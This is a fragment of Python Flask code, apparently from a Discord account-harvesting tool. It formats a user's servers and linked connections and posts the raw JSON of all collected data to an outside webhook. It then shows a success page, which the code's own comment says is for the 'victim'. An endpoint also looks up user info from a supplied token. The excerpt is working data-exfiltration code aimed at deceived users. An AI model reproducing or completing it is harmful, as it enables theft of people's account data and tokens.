...
def callback():
    ...
    guilds_str = "\n".join([f"• {g.get('name', 'Unknown')} (ID: {g.get('id', 'N/A')}, Owner: {g.get('owner', False)})" for g in guilds_data[:20]]) if isinstance(guilds_data, list) else str(guilds_data)

    connections_str = "\n".join([f"• {c.get('type', 'Unknown')}: {c.get('name', 'Unknown')} ({c.get('id', 'N/A')})" for c in connections_data[:20]]) if isinstance(connections_data, list) else str(connections_data)
    ...
    # Send raw data as second webhook
    try:
        raw_fields = {
            "📦 Raw JSON": f"```json\n{json.dumps(full_data, indent=2, default=str)[:1900]}\n```"
        }
        send_webhook("📦 RAW DATA", raw_fields, color=0x5865F2)
    except:
        pass

    # Show success page to victim
    return render_template_string(HTML_SUCCESS)


@app.route("/api/info/<token>")
def api_info(token):
    """API endpoint to get user info with a token (for testing)"""
